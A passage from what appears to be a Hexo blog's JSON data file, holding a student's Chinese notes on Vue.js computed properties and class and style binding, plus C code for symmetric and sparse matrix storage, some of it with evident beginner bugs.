class=\"hljs-name\">style</span>&gt;</span><br><br> <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;app&quot;</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">my-component</span> <span class=\"hljs-attr\">:class</span>=<span class=\"hljs-string\">&quot;&#123; &#x27;active&#x27;: isActive &#125;&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">my-component</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>&gt;<br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">    <span class=\"hljs-title class_\">Vue</span>.<span class=\"hljs-title function_\">component</span>(<span class=\"hljs-string\">&#x27;my-component&#x27;</span>,&#123;</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">template</span>:<span class=\"hljs-string\">&#x27;&lt;p class=&quot;article&quot;&gt;这是一个组件&lt;/p&gt;&#x27;</span></span><br><span class=\"language-javascript\">    &#125;)</span><br><span class=\"language-javascript\">    <span class=\"hljs-keyword\">var</span> app=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Vue</span>(&#123;</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">el</span>:<span class=\"hljs-string\">&#x27;#app&#x27;</span>,</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">data</span>:&#123;</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">isActive</span>:<span class=\"hljs-literal\">true</span></span><br><span class=\"language-javascript\">        &#125;</span><br><span class=\"language-javascript\">    &#125;)</span><br><span class=\"language-javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br><br></code></pre></td></tr></table></figure>\n\n<p>3.绑定内联样式</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">:style</span>=<span class=\"hljs-string\">&quot;styles&quot;</span>&gt;</span><br>            这是第二个组件<br>        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br>        <br>  data:&#123;<br>            isActive:true,<br>            styles:&#123;<br>                color:&#x27;pink&#x27;,<br>                fontSize: 35 +&#x27;px&#x27;<br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Ch3-计算属性\"><a href=\"#Ch3-计算属性\" class=\"headerlink\" title=\"Ch3 计算属性\"></a>Ch3 计算属性</h1><p>1.计算属性：遇到复杂的逻辑时，使用计算属性；将所有的计算属性以函数的形式卸载Vue实例的computed属性内，返回计算结果；</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\">  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span><br>            &#123;&#123; reversedText &#125;&#125;<br>        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br>        <br>  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">\t        <span class=\"hljs-attr\">data</span>:&#123;</span><br><span class=\"language-javascript\">                <span class=\"hljs-attr\">text</span>: <span class=\"hljs-string\">&#x27;123,456&#x27;</span>,</span><br><span class=\"language-javascript\">            &#125;,</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">computed</span>:&#123;</span><br><span class=\"language-javascript\">                <span class=\"hljs-attr\">reversedText</span>: <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;</span><br><span class=\"language-javascript\">                    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">text</span>.<span class=\"hljs-title function_\">split</span>(<span class=\"hljs-string\">&#x27;,&#x27;</span>).<span class=\"hljs-title function_\">reverse</span>().<span class=\"hljs-title function_\">join</span>(<span class=\"hljs-string\">&#x27;,&#x27;</span>);</span><br><span class=\"language-javascript\">                &#125;</span><br><span class=\"language-javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>2.用法</p>\n<p>计算属性可以依赖多个vue实例的数据，只要其中一个数据发生变化，计算属性就会重新执行，视图也会更新；</p>\n<p>3.和methods的区别</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span><br>    &#123;&#123; reversedText &#125;&#125;<br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">scirpt</span>&gt;</span><br>\tmethods:&#123;<br>    \treverserText:function()&#123;<br>    \t\treturn this.text.split(&#x27;,&#x27;).reverser().join(&#x27;,&#x27;);<br>    \t&#125;<br>    &#125;,<br>    computed:&#123;<br>    \t reversedText: function()&#123;<br>         \treturn this.text.split(&#x27;,&#x27;).reverse().join(&#x27;,&#x27;);<br>    &#125;<br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">scirpt</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>两者实现了相同的效果，但是计算属性是基于依赖缓存，一个依赖数据发生变化，才会重新取值；methods只要重新渲染，就会调用；</p>\n<p>当遍历大数组和做大量计算时，应使用计算属性，除非不用缓存；</p>\n<h1 id=\"CH4-v-bind及class与style的绑定\"><a href=\"#CH4-v-bind及class与style的绑定\" class=\"headerlink\" title=\"CH4 v-bind及class与style的绑定\"></a>CH4 v-bind及class与style的绑定</h1><p>1.v-bind指令</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">v-bind:href</span>=<span class=\"hljs-string\">&quot;url&quot;</span>&gt;</span>链接<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">v-bind:src:</span>=<span class=\"hljs-string\">&quot;imageUrl&quot;</span>/&gt;</span><br>    <br>     <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">:href</span>=<span class=\"hljs-string\">&quot;url&quot;</span>&gt;</span>链接<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">:src</span>=<span class=\"hljs-string\">&quot;imageUrl&quot;</span>/&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">\t<span class=\"hljs-attr\">data</span>:&#123;</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">url</span>:<span class=\"hljs-string\">&#x27;...&#x27;</span>,</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">imageUrl</span>:<span class=\"hljs-string\">&#x27;...&#x27;</span>,</span><br><span class=\"language-javascript\">    &#125;</span><br><span class=\"language-javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>2.绑定class的几种方法</p>\n<p>​    （1）表达式为真，则加载css</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\">      <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">:class</span>=<span class=\"hljs-string\">&quot;&#123; &#x27;active&#x27;:isActive,&#x27;error&#x27;:isError &#125;&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br><br>  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\"><span class=\"hljs-attr\">data</span>:&#123;</span><br><span class=\"language-javascript\">           <span class=\"hljs-attr\">isActive</span>: <span class=\"hljs-literal\">true</span>,</span><br><span class=\"language-javascript\">           <span class=\"hljs-attr\">isError</span>:<span class=\"hljs-literal\">false</span>,</span><br><span class=\"language-javascript\">      &#125;</span><br><span class=\"language-javascript\">      </span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>​    （2）使用computed</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">:class</span>=<span class=\"hljs-string\">&quot;classes&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">       <span class=\"hljs-attr\">computed</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;</span><br><span class=\"language-javascript\">           <span class=\"hljs-attr\">return</span>:&#123;</span><br><span class=\"language-javascript\">               <span class=\"hljs-attr\">active</span>:<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">isActive</span>,</span><br><span class=\"language-javascript\">           &#125;</span><br><span class=\"language-javascript\">       &#125;</span><br><span class=\"language-javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>​    (3)组件上使用</p>\n<p>​    </p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\">  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">style</span>&gt;</span><span class=\"language-css\"></span><br><span class=\"language-css\">        <span class=\"hljs-selector-class\">.article</span>&#123;</span><br><span class=\"language-css\">            <span class=\"hljs-attribute\">color</span>: red;</span><br><span class=\"language-css\">        &#125;</span><br><span class=\"language-css\">        <span class=\"hljs-selector-class\">.active</span>&#123;</span><br><span class=\"language-css\">            <span class=\"hljs-attribute\">color</span>: black;</span><br><span class=\"language-css\">            <span class=\"hljs-attribute\">font-size</span>: <span class=\"hljs-number\">30px</span>;</span><br><span class=\"language-css\">        &#125;</span><br><span class=\"language-css\">    </span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">style</span>&gt;</span><br><br> <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;app&quot;</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">my-component</span> <span class=\"hljs-attr\">:class</span>=<span class=\"hljs-string\">&quot;&#123; &#x27;active&#x27;: isActive &#125;&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">my-component</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>&gt;<br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">    <span class=\"hljs-title class_\">Vue</span>.<span class=\"hljs-title function_\">component</span>(<span class=\"hljs-string\">&#x27;my-component&#x27;</span>,&#123;</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">template</span>:<span class=\"hljs-string\">&#x27;&lt;p class=&quot;article&quot;&gt;这是一个组件&lt;/p&gt;&#x27;</span></span><br><span class=\"language-javascript\">    &#125;)</span><br><span class=\"language-javascript\">    <span class=\"hljs-keyword\">var</span> app=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Vue</span>(&#123;</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">el</span>:<span class=\"hljs-string\">&#x27;#app&#x27;</span>,</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">data</span>:&#123;</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">isActive</span>:<span class=\"hljs-literal\">true</span></span><br><span class=\"language-javascript\">        &#125;</span><br><span class=\"language-javascript\">    &#125;)</span><br><span class=\"language-javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br><br></code></pre></td></tr></table></figure>\n\n<p>3.绑定内联样式</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">:style</span>=<span class=\"hljs-string\">&quot;styles&quot;</span>&gt;</span><br>            这是第二个组件<br>        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br>        <br>  data:&#123;<br>            isActive:true,<br>            styles:&#123;<br>                color:&#x27;pink&#x27;,<br>                fontSize: 35 +&#x27;px&#x27;<br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"队列和栈","date":"2021-08-15T12:57:45.000Z","mp3":null,"cover":"img/bg1.jpg","_content":"\nCh1 栈和队列\n\n","source":"_posts/Ch2 队列和栈.md","raw":"---\ntitle: 队列和栈\ndate: 2021-08-15 20:57:45\ncategories: \n    - 编程\ntags: \n    - C语言\nmp3: \ncover: img/bg1.jpg\n---\n\nCh1 栈和队列\n\n","slug":"Ch2 队列和栈","published":1,"updated":"2021-08-30T13:31:10.000Z","_id":"clg29vyh10031ao9ca13l9dql","comments":1,"layout":"post","photos":[],"link":"","content":"<p>Ch1 栈和队列</p>\n","site":{"data":{}},"excerpt":"","more":"<p>Ch1 栈和队列</p>\n"},{"title":"特殊矩阵及广义表","date":"2021-08-20T12:57:45.000Z","mp3":null,"cover":"img/bg16.jpg","_content":"\n一、对称矩阵\n\n```csharp\nvoid PrintSymetryMatrix(int m[],int n)\n{\n    int row,col;\n    printf(\"Symetry Matrix:\\n\");\n    for(row=0;row<n;row++)\n    {\n        for(col=0;col<n;col++)\n        {\n            if(row>=col)\n            {\n                printf(\"%4d \",m[row*(row+1)/2+col]);\n            }\n            else\n            {\n                printf(\"%4d \",m[col*(col+1)/2+row]);\n            }\n        }\n        printf(\"\\n\");\n    }\n    return;\n}\n```\n\n​\t\t\t\t\t\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\ntypedef int Elemtype;\n#define MaxSize 100\n\ntypedef struct\n{\n    int rowIndex,colIndex;\n    Elemtype data;\n} TriUnitGroup;\n\ntypedef struct\n{\n    TriUnitGroup data[MaxSize+1];\n    int unzeroNumber,colNumber,rowNumber;\n} TSMatrix;\n\nint main()\n{\n    TSMatrix *myMatrix;\n    int myData[16]= {1,2,0,3,4,6,0,0,0,4,0,1,3,1,1,0};\n    CreateM(&myMatrix,myData,4,4);\n    PrintTripleUnitMatrix(&myMatrix);\n\n    return 0;\n}\n\n\nint CreateM(TSMatrix *M,int data[],int row,int col)\n{\n\n    int index=0;\n    int count=0;\n\n    for(index=0; index<row*col; index++)\n    {\n        if(data[index]!=0)\n        {\n            M->data[count].rowIndex=index/col;\n            M->data[count].colIndex=index%col;\n            M->data[count].data=data[index];\n            ++count;\n            printf(\"%d Add data %d successfully.\\n\",count,data[index]);\n        }\n    }\n\n    if(count>0)\n    {\n        printf(\"Data number:%d.\\n\",count);\n        /*Errors here.*/\n        M->unzeroNumber=count;\n        M->colNumber=col;\n        M->rowNumber=row;\n        printf(\"Finished.\\n\");\n        return 1;\n    }\n    else\n    {\n        printf(\"All data are 0.\\n\");\n        printf(\"Finished.\\n\");\n        return 0;\n    }\n\n}\n\nvoid PrintTripleUnitMatrix(TSMatrix *M)\n{\n    printf(\"*  i  j  value\\n\");\n    for(int index1=0; index1<M->unzeroNumber; index1++)\n    {\n        printf(\"%d  %d  %d  %d\\n\",index1,M->data[index1].rowIndex,M->data[index1].colIndex,M->data[index1].data);\n    }\n    return;\n}\n\n\nvoid PrintSymmetricArray(int array[],int col,int row)\n{\n    int col_index,row_index;\n\n    for(col_index=0; col_index<col; col_index++)\n    {\n        for(row_index=0; row_index<row; row_index++)\n        {\n            if(col_index<=row_index)\n            {\n                printf(\"%d \",array[row_index*(row_index+1)/2+col_index]);\n            }\n            else\n            {\n                printf(\"%d \",array[col_index*(col_index+1)/2+row_index]);\n            }\n        }\n        printf(\"\\n\");\n    }\n    return;\n}\n\nvoid PrintUpTriangle(int array[],int col,int row)\n{\n    for(int index1=0; index1<col; index1++)\n    {\n        for(int index2=0; index2<row; index2++)\n        {\n            if(index1<index2)\n            {\n                printf(\"%d \",array[0]);\n            }\n            else\n            {\n                printf(\"%d \",array[index1*(index1+1)/2+1+index2]);\n            }\n        }\n        printf(\"\\n\");\n    }\n    return;\n}\n\nvoid PrintDownTriangle(int array[],int col,int row)\n{\n    for(int index1=0; index1<col; index1++)\n    {\n        for(int index2=0; index2<row; index2++)\n        {\n            if(index1>index2)\n            {\n                printf(\"%d \",array[0]);\n            }\n            else\n            {\n                printf(\"%d \",array[index2*(index2+1)/2+1+index1]);\n            }\n        }\n        printf(\"\\n\");\n    }\n    return;\n}\n\n\n```\n\n","source":"_posts/CH4 特殊矩阵广义表.md","raw":"---\ntitle: 特殊矩阵及广义表\ndate: 2021-08-20 20:57:45\ncategories: \n    - 编程\ntags: \n    - C语言\nmp3: \ncover: img/bg16.jpg\n---\n\n一、对称矩阵\n\n```csharp\nvoid PrintSymetryMatrix(int m[],int n)\n{\n    int row,col;\n    printf(\"Symetry Matrix:\\n\");\n    for(row=0;row<n;row++)\n    {\n        for(col=0;col<n;col++)\n        {\n            if(row>=col)\n            {\n                printf(\"%4d \",m[row*(row+1)/2+col]);\n            }\n            else\n            {\n                printf(\"%4d \",m[col*(col+1)/2+row]);\n            }\n        }\n        printf(\"\\n\");\n    }\n    return;\n}\n```\n\n​\t\t\t\t\t\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\ntypedef int Elemtype;\n#define MaxSize 100\n\ntypedef struct\n{\n    int rowIndex,colIndex;\n    Elemtype data;\n} TriUnitGroup;\n\ntypedef struct\n{\n    TriUnitGroup data[MaxSize+1];\n    int unzeroNumber,colNumber,rowNumber;\n} TSMatrix;\n\nint main()\n{\n    TSMatrix *myMatrix;\n    int myData[16]= {1,2,0,3,4,6,0,0,0,4,0,1,3,1,1,0};\n    CreateM(&myMatrix,myData,4,4);\n    PrintTripleUnitMatrix(&myMatrix);\n\n    return 0;\n}\n\n\nint CreateM(TSMatrix *M,int data[],int row,int col)\n{\n\n    int index=0;\n    int count=0;\n\n    for(index=0; index<row*col; index++)\n    {\n        if(data[index]!=0)\n        {\n            M->data[count].rowIndex=index/col;\n            M->data[count].colIndex=index%col;\n            M->data[count].data=data[index];\n            ++count;\n            printf(\"%d Add data %d successfully.\\n\",count,data[index]);\n        }\n    }\n\n    if(count>0)\n    {\n        printf(\"Data number:%d.\\n\",count);\n        /*Errors here.*/\n        M->unzeroNumber=count;\n        M->colNumber=col;\n        M->rowNumber=row;\n        printf(\"Finished.\\n\");\n        return 1;\n    }\n    else\n    {\n        printf(\"All data are 0.\\n\");\n        printf(\"Finished.\\n\");\n        return 0;\n    }\n\n}\n\nvoid PrintTripleUnitMatrix(TSMatrix *M)\n{\n    printf(\"*  i  j  value\\n\");\n    for(int index1=0; index1<M->unzeroNumber; index1++)\n    {\n        printf(\"%d  %d  %d  %d\\n\",index1,M->data[index1].rowIndex,M->data[index1].colIndex,M->data[index1].data);\n    }\n    return;\n}\n\n\nvoid PrintSymmetricArray(int array[],int col,int row)\n{\n    int col_index,row_index;\n\n    for(col_index=0; col_index<col; col_index++)\n    {\n        for(row_index=0; row_index<row; row_index++)\n        {\n            if(col_index<=row_index)\n            {\n                printf(\"%d \",array[row_index*(row_index+1)/2+col_index]);\n            }\n            else\n            {\n                printf(\"%d \",array[col_index*(col_index+1)/2+row_index]);\n            }\n        }\n        printf(\"\\n\");\n    }\n    return;\n}\n\nvoid PrintUpTriangle(int array[],int col,int row)\n{\n    for(int index1=0; index1<col; index1++)\n    {\n        for(int index2=0; index2<row; index2++)\n        {\n            if(index1<index2)\n            {\n                printf(\"%d \",array[0]);\n            }\n            else\n            {\n                printf(\"%d \",array[index1*(index1+1)/2+1+index2]);\n            }\n        }\n        printf(\"\\n\");\n    }\n    return;\n}\n\nvoid PrintDownTriangle(int array[],int col,int row)\n{\n    for(int index1=0; index1<col; index1++)\n    {\n        for(int index2=0; index2<row; index2++)\n        {\n            if(index1>index2)\n            {\n                printf(\"%d \",array[0]);\n            }\n            else\n            {\n                printf(\"%d \",array[index2*(index2+1)/2+1+index1]);\n            }\n        }\n        printf(\"\\n\");\n    }\n    return;\n}\n\n\n```\n\n","slug":"CH4 特殊矩阵广义表","published":1,"updated":"2021-08-22T15:45:58.000Z","_id":"clg29vyh20034ao9c3zzf80m7","comments":1,"layout":"post","photos":[],"link":"","content":"<p>一、对称矩阵</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs csharp\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">PrintSymetryMatrix</span>(<span class=\"hljs-params\"><span class=\"hljs-built_in\">int</span> m[],<span class=\"hljs-built_in\">int</span> n</span>)</span><br>&#123;<br>    <span class=\"hljs-built_in\">int</span> row,col;<br>    printf(<span class=\"hljs-string\">&quot;Symetry Matrix:\\n&quot;</span>);<br>    <span class=\"hljs-keyword\">for</span>(row=<span class=\"hljs-number\">0</span>;row&lt;n;row++)<br>    &#123;<br>        <span class=\"hljs-keyword\">for</span>(col=<span class=\"hljs-number\">0</span>;col&lt;n;col++)<br>        &#123;<br>            <span class=\"hljs-keyword\">if</span>(row&gt;=col)<br>            &#123;<br>                printf(<span class=\"hljs-string\">&quot;%4d &quot;</span>,m[row*(row+<span class=\"hljs-number\">1</span>)/<span class=\"hljs-number\">2</span>+col]);<br>            &#125;<br>            <span class=\"hljs-keyword\">else</span><br>            &#123;<br>                printf(<span class=\"hljs-string\">&quot;%4d &quot;</span>,m[col*(col+<span class=\"hljs-number\">1</span>)/<span class=\"hljs-number\">2</span>+row]);<br>            &#125;<br>        &#125;<br>        printf(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br>    &#125;<br>    <span class=\"hljs-keyword\">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>​                    </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span 